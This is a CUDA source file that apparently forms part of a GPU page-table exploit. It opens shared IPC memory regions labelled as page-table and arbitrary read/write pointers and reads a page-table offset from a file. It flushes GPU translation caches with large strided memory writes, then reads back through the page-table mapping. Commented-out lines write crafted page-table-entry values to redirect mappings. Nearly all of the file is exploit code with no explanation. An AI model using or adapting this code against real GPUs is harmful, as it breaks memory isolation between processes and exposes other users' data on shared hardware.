#include "./transfer.cuh"
#include <cuda_runtime.h>
#include <fstream>
#include <iostream>

__global__ void initialize_memory_loop(uint8_t *array, uint64_t size)
{
    for (uint64_t i = 0; i < size; i += 65536)
        *(uint8_t **)(array + i) = array + i;
}

void gen_64KB(char *array, uint64_t size)
{
    for (uint64_t i = 0; i < size; i += 2 * 1024 * 1024)
        *(char **)(array + i) = (array + i);
}

__global__ void simple_flush(char *array, uint64_t size)
{
    for (uint64_t i = 0; i < size; i += 64 * 1024)
    {
        if ((i % (2 * 1024 * 1024)) != 0)
            *(char **)(array + i) = (array + i);
    }
}

int main()
{
    void *copy_ptr;
    cudaMallocManaged(&copy_ptr, 8);

    void *pt_rw_ptr = openIPCPointer(0);
    void *arb_rw_ptr = openIPCPointer(1);

    std::cout << pt_rw_ptr << ' ' << arb_rw_ptr << '\n';

    std::cout << "Opened both CUDA IPC memory regions\n";

    cudaMemcpyArray((uint8_t *)copy_ptr, (uint8_t *)pt_rw_ptr, 8);
    std::cout << pt_rw_ptr << *(void **)copy_ptr << '\n';
    cudaMemcpyArray((uint8_t *)copy_ptr, (uint8_t *)(arb_rw_ptr), 8);
    std::cout << arb_rw_ptr << *(void **)copy_ptr << '\n';

    uint64_t ofs = getPTOfs("./new_offset.bin");

    std::cout << ofs << '\n';

    cudaMemcpyArray((uint8_t *)copy_ptr, (uint8_t *)pt_rw_ptr, 8);
    std::cout << pt_rw_ptr << *(void **)copy_ptr << '\n';
    cudaMemcpyArray((uint8_t *)copy_ptr, (uint8_t *)(arb_rw_ptr), 8);
    std::cout << arb_rw_ptr << *(void **)copy_ptr << '\n';

    // Example usage
    paused();

    // cudaMemcpyArray((uint8_t*)copy_ptr, (uint8_t*)pt_rw_ptr + ofs, 8);
    // std::cout << pt_rw_ptr << *(void**)copy_ptr << '\n';
    // memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr, (uint64_t)(0x60000000000001), 8);
    // cudaDeviceSynchronize();
    // cudaMemcpyArray((uint8_t*)copy_ptr, (uint8_t*)(arb_rw_ptr), 8);
    // std::cout << arb_rw_ptr << *(void**)copy_ptr << '\n';

    // pause();

    // cudaMemcpyArray((uint8_t*)copy_ptr, (uint8_t*)pt_rw_ptr + ofs, 8);
    // std::cout << pt_rw_ptr << *(void**)copy_ptr << '\n';
    // cudaMemcpyArray((uint8_t*)copy_ptr, (uint8_t*)(arb_rw_ptr), 8);
    // std::cout << arb_rw_ptr << *(void**)copy_ptr << '\n';

    // modify(pt_rw_ptr, ofs, (uint64_t)(0x60000016dc0001));
    // cudaDeviceSynchronize();

    char *flush_ptr;
    uint8_t *data_device_ptr;
    uint64_t flush_size = 4L * 1024 * 1024 * 1024;
    cudaMallocManaged(&flush_ptr, flush_size);
    cudaMallocManaged(&data_device_ptr, 2L * 1024 * 1024);

    initialize_memory_loop<<<1, 1>>>((uint8_t *)flush_ptr, flush_size);
    cudaDeviceSynchronize();
    gpuErrchk(cudaPeekAtLastError());

    // Generate 64KB Pages
    gen_64KB(flush_ptr, flush_size);

    // Flush
    simple_flush<<<1, 1>>>(flush_ptr, flush_size);
    cudaDeviceSynchronize();
    gpuErrchk(cudaPeekAtLastError());

    cudaMemcpyArray((uint8_t *)copy_ptr, (uint8_t *)pt_rw_ptr + ofs, 8);
    std::cout << pt_rw_ptr << *(void **)copy_ptr << '\n';
    cudaMemcpyArray((uint8_t *)copy_ptr, (uint8_t *)(arb_rw_ptr), 8);
    std::cout << arb_rw_ptr << *(void **)copy_ptr << '\n';

    paused();

    cudaIpcCloseMemHandle(pt_rw_ptr);
    cudaIpcCloseMemHandle(arb_rw_ptr);
}